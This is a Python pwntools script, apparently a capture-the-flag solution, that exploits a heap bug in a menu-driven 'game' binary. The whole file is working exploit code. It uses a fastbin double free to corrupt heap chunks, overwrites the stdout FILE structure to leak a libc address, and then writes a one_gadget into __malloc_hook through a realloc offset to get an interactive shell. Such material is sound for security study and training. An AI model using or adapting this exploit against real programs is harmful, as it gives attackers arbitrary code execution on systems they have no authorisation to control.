from parse_args_and_some_func import *

sh = all_parsed_args['io']

def Add(sh:tube, size:int, name:(str, bytes), 
        msg:(str, bytes)=8 * b'\x00' + p64(0x71) + b'\x00' * 7):
    assert size > 0 and size <= 0x70
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    return sh.recvline()


def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '2')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvline()

def attack(sh:tube, malloc_hook_offset, gadget_offset, 
            realloc_offset, low_2th_byte:int=0xe5):
    Add(sh, 0x60, 14 * p64(0x71)) # 0
    Add(sh, 0x60, 14 * p64(0x71)) # 1

    Delete(sh, 0)
    Delete(sh, 1)
    Delete(sh, 0)
    STOP()
    Add(sh, 0x60, '\x20') # 2
    STOP()
    Add(sh, 0x60, '\x20') # 3
    Add(sh, 0x60, '\x20') # 4
    Add(sh, 0x60, p64(0) + p64(0x71)) # 5

    Delete(sh, 0)
    Delete(sh, 5)

    Add(sh, 0x60, p64(0) + p64(0x91)) # 6
    Add(sh, 0x20, 'bbbb') # 7
    Delete(sh, 0)
    STOP()

    Delete(sh, 5)
    Delete(sh, 7)

    get = input('get low 2th byte (hex):')
    get = int16(get)
    get = get.to_bytes(1, 'big')
    Add(sh, 0x60, p64(0) + p64(0x71) + b'\xdd' + get) # 8
    Delete(sh, 7)
    Add(sh, 0x60, 'deadbeef') # 9
    Delete(sh, 7)
    STOP()
    # 10
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(0x60))
    sh.sendafter("game's name:\n", 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58')
    leak_libc_addr = u64(sh.recvn(8))
    sh.sendlineafter("game's message:\n", 'aaa')
    LOG_ADDR('leak_libc_addr', leak_libc_addr)

    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)
    STOP()
    Delete(sh, 5)
    Delete(sh, 0)
    Delete(sh, 5)

    target_addr = libc_base_addr + malloc_hook_offset - 0x23

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr)) # 11
    STOP()
    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    one_gadget = libc_base_addr + gadget_offset
    Add(sh, 0x60, 0xb * b'a' + p64(one_gadget) + p64(libc_base_addr + realloc_offset + 0xd))
    STOP()
    LOG_ADDR('one_gadget addr', one_gadget)
    sh.sendlineafter("Your choice : ", '1')
    sh.interactive()


if __name__ == '__main__':
    attack(sh, 0x3c4b10, 0x4527a, 0x84710)
    
